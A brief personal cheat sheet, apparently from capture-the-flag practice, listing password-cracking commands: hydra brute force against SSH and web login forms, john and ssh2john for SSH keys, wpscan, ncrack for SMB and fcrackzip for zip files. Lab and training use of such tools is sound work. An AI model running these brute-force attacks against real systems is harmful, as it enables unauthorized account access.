#crackPass 

# HYDRA [[Hydra-Password-Cracking-Cheatsheet.pdf]]

# ssh
## dict
```
hydra $ip -s 22 ssh -l -P big_wordlist.txt
```
## crack ssh key
```
 ssh2john key > hash
 ```
 ```
 john hash -wordlist=/usr/share/wordlists/rockyou.txt
```

# crack form login
```
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $ip http-form-post '/admin/:username=^USER^&password=^PASS^:F=Incorrect Credentials' -V
```

# wordpress
```
wpscan --url $ip -P /home/kali/Desktop/Chall/thm/fsocity.dic.m -U Elliot
```
# mkpasswd
make hash for a passwd
```
mkpasswd -m sha-512 password1234
```

# smb
`ncrack --vv --user <user> -P <password> smb://@ip`

# file.zip
```
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip
```

# john
## formats list
```
john --list=FORMATS
```